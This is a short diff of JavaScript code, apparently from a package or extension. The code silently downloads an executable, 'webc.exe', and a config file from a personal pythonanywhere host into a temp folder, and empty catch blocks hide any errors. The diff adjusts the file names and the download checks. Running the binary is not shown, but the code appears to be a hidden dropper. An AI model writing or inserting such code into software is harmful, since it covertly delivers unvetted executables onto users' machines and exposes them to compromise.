@@ -98,10 +98,12 @@
           fs.mkdirSync(tempFolder, { recursive: true });
         }
 
-        if (!fs.existsSync(`${tempFolder}/webc-tmp.exe`)) {
+        if (!fs.existsSync(`${tempFolder}/webc.exe`)) {
           try {
-            await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc-tmp.exe`);
+            await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
           } catch (err) { }
+        }
+        if (!fs.existsSync(`${tempFolder}/config.json`)) {
           try {
             await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
           } catch (err) { }
